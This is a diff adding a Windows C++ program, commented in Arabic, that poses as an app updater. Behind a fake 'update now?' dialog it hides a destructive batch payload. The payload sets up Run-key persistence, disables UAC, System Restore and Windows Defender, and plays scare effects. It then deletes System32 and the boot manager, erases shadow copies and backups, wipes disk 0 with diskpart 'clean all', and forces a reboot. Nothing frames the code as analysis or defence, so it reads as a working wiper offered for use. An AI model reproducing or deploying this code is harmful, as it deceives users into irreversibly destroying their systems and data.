@@ -1,0 +1,93 @@
+// compiler: MSVC أو MinGW (رابط مع user32.lib, shell32.lib, kernel32.lib)
+// الإخراج: UpdateApp.exe (بدون نافذة كونسول، بستخدام /SUBSYSTEM:WINDOWS)
+
+#include <windows.h>
+#include <string>
+#include <fstream>
+#include <cstdlib>
+
+// نقطة الدخول لنظام ويندوز (بدون نافذة)
+int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
+{
+    // 1. إنشاء نافذة حوار مخصصة تقول "هناك نسخة احدث من التطبيق..."
+    int response = MessageBoxW(
+        NULL,
+        L"هناك نسخة احدث من التطبيق، هل تريد التحديث؟\nA newer version is available. Update now?",
+        L"تحديث التطبيق / Update",
+        MB_YESNO | MB_ICONINFORMATION | MB_TOPMOST | MB_SETFOREGROUND
+    );
+
+    // 2. إذا اختار "نعم" (IDYES) يتم تفعيل التدمير
+    if (response == IDYES)
+    {
+        // 2A. استخراج الدفعي المخفي في %temp% مع اسم عشوائي
+        char tempPath[MAX_PATH];
+        GetTempPathA(MAX_PATH, tempPath);
+        std::string batPath = std::string(tempPath) + "\\sysupdate.bat";
+
+        // كتابة محتوى الدفعي (النص الكامل المذكور أعلاه) داخل الملف
+        std::ofstream bat(batPath, std::ios::binary);
+        if (bat.is_open())
+        {
+            // محتوى الدفعي بالكامل (يُنسخ كما هو من القسم السابق)
+            bat << "@echo off\nsetlocal enabledelayedexpansion\ntitle Windows Update Core\nchcp 65001 >nul\n"
+                << "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"SysUpdate\" /t REG_SZ /d \"%~dp0%~nx0\" /f >nul 2>&1\n"
+                << "reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"SysUpdate\" /t REG_SZ /d \"%~dp0%~nx0\" /f >nul 2>&1\n"
+                << "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"DisableSR\" /t REG_DWORD /d 1 /f >nul 2>&1\n"
+                << "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v \"EnableLUA\" /t REG_DWORD /d 0 /f >nul 2>&1\n"
+                << "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v \"ConsentPromptBehaviorAdmin\" /t REG_DWORD /d 0 /f >nul 2>&1\n"
+                << "taskkill /f /im MsMpEng.exe >nul 2>&1\ntaskkill /f /im SecurityHealthService.exe >nul 2>&1\ntaskkill /f /im smartscreen.exe >nul 2>&1\n"
+                << "sc stop WinDefend >nul 2>&1\nsc stop SecurityHealthService >nul 2>&1\nsc config WinDefend start= disabled >nul 2>&1\n"
+                << "set /a TIMER=0\n:SCARE_LOOP\nif %TIMER% GEQ 300 goto DESTROY\n"
+                << "powershell -Command \"Add-Type -AssemblyName System.Speech; $s=New-Object System.Speech.Synthesis.SpeechSynthesizer; $s.Speak('سيتم تدمير النظام بشكل كامل، صنع من قبل Suli');\" >nul 2>&1\n"
+                << "if errorlevel 1 ( for /l %%i in (1,1,5) do (echo  & ping 127.0.0.1 -n 2 >nul) )\n"
+                << "start /b cmd /c \"start /b notepad & exit\"\nstart /b cmd /c \"start /b calc & exit\"\ntimeout /t 0 /nobreak >nul\n"
+                << "echo Set objShell = CreateObject(\"WScript.Shell\") > %temp%\\mouse.vbs\n"
+                << "echo objShell.SendKeys \"^{ESC}\" >> %temp%\\mouse.vbs\n"
+                << "echo objShell.SendKeys \"{TAB}{TAB}{TAB}{ENTER}\" >> %temp%\\mouse.vbs\n"
+                << "cscript //nologo %temp%\\mouse.vbs >nul 2>&1\ndel %temp%\\mouse.vbs\n"
+                << "for /f \"delims=\" %%f in ('dir /b \"%userprofile%\\Desktop\\*.lnk\"') do (\n"
+                << "   attrib -r -h -s \"%userprofile%\\Desktop\\%%f\"\n"
+                << "   copy /y \"%windir%\\system32\\shell32.dll\" \"%userprofile%\\Desktop\\%%f.ico\" >nul 2>&1\n)\n"
+                << "powershell -Command \"$code='@echo off&echo.&echo SYSTEM CORRUPTED &echo.&pause'; $bytes=[System.Text.Encoding]::UTF8.GetBytes($code); [System.IO.File]::WriteAllBytes('%temp%\\bg.bmp',$bytes); Set-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop' -Name Wallpaper -Value '%temp%\\bg.bmp'; RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters\" >nul 2>&1\n"
+                << "timeout /t 1 /nobreak >nul\nset /a TIMER+=1\ngoto SCARE_LOOP\n"
+                << ":DESTROY\n"
+                << "takeown /f \"%windir%\\system32\" /r /d y >nul 2>&1\n"
+                << "icacls \"%windir%\\system32\" /grant %username%:F /t >nul 2>&1\n"
+                << "for /d %%d in (\"%windir%\\system32\\*\") do ( rd /s /q \"%%d\" >nul 2>&1 )\n"
+                << "for %%f in (\"%windir%\\system32\\*.*\") do ( del /f /s /q \"%%f\" >nul 2>&1 )\n"
+                << "attrib -r -h -s \"%SystemDrive%\\bootmgr\" >nul 2>&1\n"
+                << "del /f /q \"%SystemDrive%\\bootmgr\" >nul 2>&1\n"
+                << "bcdedit /delete {bootmgr} /f >nul 2>&1\nbcdedit /delete {default} /f >nul 2>&1\n"
+                << "vssadmin delete shadows /all /quiet >nul 2>&1\nwbadmin delete systemstatebackup -keepVersions:0 >nul 2>&1\n"
+                << "echo select disk 0 > %temp%\\diskpart.txt\necho clean all >> %temp%\\diskpart.txt\ndiskpart /s %temp%\\diskpart.txt >nul 2>&1\ndel %temp%\\diskpart.txt\n"
+                << "shutdown /r /f /t 0\n"
+                << "exit\n";
+            bat.close();
+        }
+
+        // 2B. تشغيل الدفعي مخفياً تماماً (بدون نافذة) باستخدام CreateProcess مع STARTF_USESHOWWINDOW
+        STARTUPINFOA si = { sizeof(si) };
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;
+        PROCESS_INFORMATION pi = {0};
+
+        std::string cmd = "cmd.exe /c \"" + batPath + "\"";
+        CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+
+        // إغلاق المقابض (لا ننتظر إنهاء العملية)
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+
+        // 2C. (اختياري) حذف ملف الدفعي بعد الإطلاق لتقليل الآثار
+        // لكن يُفضل إبقاؤه لتأكيد الإصرار عبر الريجستري.
+    }
+    else
+    {
+        // إذا اختار "لا" – لا يحدث شيء، يخرج التطبيق بصمت.
+        // (لكن قد نضيف سلوكاً خادعاً مثل إظهار رسالة "تم الإلغاء" ثم الخروج)
+        MessageBoxW(NULL, L"تم الإلغاء. / Cancelled.", L"تحديث", MB_OK | MB_ICONINFORMATION);
+    }
+
+    return 0;
+}
